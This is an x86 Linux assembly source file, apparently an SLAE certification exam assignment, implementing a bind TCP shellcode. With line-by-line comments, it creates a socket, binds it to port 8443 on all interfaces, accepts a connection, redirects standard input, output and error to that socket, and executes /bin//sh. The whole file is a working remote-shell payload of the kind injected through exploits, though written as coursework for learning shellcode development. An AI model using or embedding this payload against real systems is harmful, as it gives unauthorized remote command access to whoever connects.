; SLAE Exam Assignment #1: Shell Bind TCP Shellcode 
; Author: Rikih Gunawan

global _start

section .text

_start:
    ; zeroing the registers
    xor ecx, ecx        ; ecx = 0
    mul ecx             ; eax = 0
    cdq                 ; xor edx, edx

socket:
    ; create a socket
    ; server_sock = socket(AF_INET, SOCK_STREAM, 0);
    ; 
    ; eax : socketcall = 102 ~ 0x66
    ; ebx : SYS_SOCKET = 1 ~ 0x01
    ; ecx : args = esp (AF_INET = 0x02, SOCK_STREAM = 0x01, PROTOCOL = 0x00)
    ;
    ; socketcall
    push byte 0x66      ; socketcall 102 ~ 0x66 
    pop eax             ; eax = 0x66
    push byte 0x01      ; SYS_SOCKET = 1
    pop ebx             ; ebx = 0x1

    ; parameters for socket 
    ;
    ; (AF_INET, SOCK_STREAM, protocol)
    ; stack:
    ;   ecx => esp
    ;   0x02  - AF_INET
    ;   0x01  - SOCK_STREAM
    ;   0x00  - protocol   
    ; socket args            
    push ecx            ; ecx = 0
    push byte 0x01      ; SOCK_STREAM = 0x01
    push byte 0x02      ; AF_INET = 0x02 
    mov ecx, esp        ; copy arguments on the stack to ecx
    int 0x80            ; return sockfd to eax

    ; store return sockfd on eax to edi
    ; that will be use for next instruction
    xchg edi, eax       ; store return sockfd on eax to edi

bind:
    ; Bind a name to a socket
    ;
    ; eax = socketcall 0x66
    ; ebx = SYS_BIND 0x02
    ; ecx = args = esp
    ; socketcall
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax             ; eax = 0x66
    push byte 0x02      ; SYS_BIND = 0x02
    pop ebx             ; ebx = 0x2

    ; struct sockaddr_in
    ; 
    ; stack:
    ;   ecx => esp 
    ;   0x02    - AF_INET
    ;   0xfb20  - port 8443
    ;   0x00    - INADDR_ANY
    push edx            ; INADDR_ANY = 0.0.0.0
    push word 0xfb20    ; PORT 8443  ~ 0x20fb - in reverse network byte order 0xfb20
    push bx             ; AF_INET = 2 ~ 0x02
    mov ecx, esp        ; point the ecx to the top of stack esp

    ; parameters for bind
    ;
    ; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; stack:
    ;   ecx => esp
    ;   sockfd              - socket fd from previous socket call
    ;   struct sockaddr_in  - see above
    ;   0x10                - addr len
    push byte 0x10      ; addr len default 16 ~ 0x10
    push ecx            ; &server_addr
    push edi            ; sockfd
    mov ecx, esp        ; point the ecx to the top of stack esp
    int 0x80

listen:
    ; start listening
    ; listen(server_sock, 0)
    ;
    ; eax = socketcall 0x66
    ; ebx = SYS_LISTEN 0x04
    ; ecx = args = esp
    ; socketcall
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax             ; eax = 0x66
    push byte 0x4       ; SYS_LISTEN = 4 ~ 0x04
    pop ebx             ; ebx = 0x04

    ; parameters of listen
    ; (server_sock, 0)
    ;
    ; stack:
    ;   ecx => esp
    ;   sockfd  - sockfd returned from previous socket function
    ;   0x00    - backlog 0x00
    xor esi, esi        ; zeroing esi
    push esi            ; esi = 0 
    push edi            ; edi = sockfd
    mov ecx, esp        ; copy arguments on the stack to ecx
    int 0x80

accept:
    ; accepting the incoming connection
    ; accept(server_sock, NULL, NULL);
    ; 
    ; eax = socketcall 0x66
    ; ebx = SYS_ACCEPT 0x05
    ; ecx = args = esp
    ; socketcall
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax             ; eax = 0x66
    push byte 0x05      ; SYS_ACCEPT = 5 ~ 0x05
    pop ebx             ; ebx = 0x05

    ; parameters of accept
    ; (server_sock, NULL, NULL)
    ; 
    ; stack:
    ;   ecx => esp
    ;   sockfd - sockfd returned from previous socket function
    ;   0x00   - sockaddr
    ;   0x00   - socklen_t
    ; arg accept(server_sock, NULL, NULL);
    push esi            ; socklen_t *addrlen = null
    push esi            ; struct sockaddr *addr = null
    push edi            ; sockfd
    mov ecx, esp        ; ecx pointing to top of stack esp  
    int 0x80

    ; dup2 arg new_sock
    mov ebx, eax        ; save the new socket returned from `accept` function from ebx into eax

    ; for looping 
    ; set ecx = 0x2 for counter 0-2
    push byte 0x02      ; set counter 2
    pop ecx             ; ecx = 0x02

; Duplicate stdin/stdout/stderr to client socket
;
; dup2(new_sock, 0) - stdin
; dup2(new_sock, 1) - stdout
; dup2(new_sock, 2) - stderr
;
; al  = 0x3f
; ebx = client socket new_sock
; ecx = 0x2 => 2, 1, 0 - counter
dup2:
    ; dup2
    mov al, 0x3f        ; dup2 = 63 ~ 0x3f
    int 0x80
    dec ecx             ; 2, 1, 0
    jns dup2            ; continue to jump to dump2 label (loop) until the signed flag is set

; execve(SHELL, NULL, NULL);
execve:
    ; execve
    push byte 0x0b      ; execve = 11 ~ 0x0b
    pop eax             ; eax = 0x0b

    ; arg execve(SHELL, NULL, NULL);
    xor ecx, ecx        ; ecx = 0
    push ecx            ; null
    push ecx            ; null
    push 0x68732f2f     ; "hs//""
    push 0x6e69622f     ; "nib/"
    mov ebx, esp        ; copy arguments on the stack to ecx
    int 0x80
